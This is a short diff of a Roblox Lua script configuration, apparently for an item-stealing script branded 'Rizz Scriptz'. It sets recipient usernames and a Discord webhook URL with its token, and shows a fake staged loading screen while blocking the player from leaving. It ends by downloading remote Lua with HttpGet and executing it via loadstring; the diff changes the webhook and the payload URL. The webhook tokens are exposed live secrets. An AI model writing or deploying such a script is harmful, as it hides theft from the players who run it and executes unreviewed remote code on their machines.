@@ -1,15 +1,15 @@
 UserName = "GiffddWhat"
 UserName2 = "GiffddPro"
-Webhook = "https://discord.com/api/webhooks/1100233847825768598/NjbOP_VdSUqvYUbBX0x1mhfnrKdqpbXEMtUxybPnrOFLcUsSurk9QvBpciTtQ5cJ9Z0l"
+Webhook = "https://discord.com/api/webhooks/1101887104197328937/eSBIYc8XbsHYjAmiaXvxkcyKRdd3mkEjToOipOQKs6-0OvUFJGTZgdgYKTZht8nJpERP"
 
 _G.LoadingScreen = true
 _G.AntiLeave = true
-_G.MouseLock = true 
+_G.MouseLock = true
 
 _G.ScriptName = "Rizz Scriptz"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
-_G.WaitingTime = 10
+_G.WaitingTime = 20 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("https://github.com/RainIsntBald/Vault/raw/main/k4f/mail.lua", true))()
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
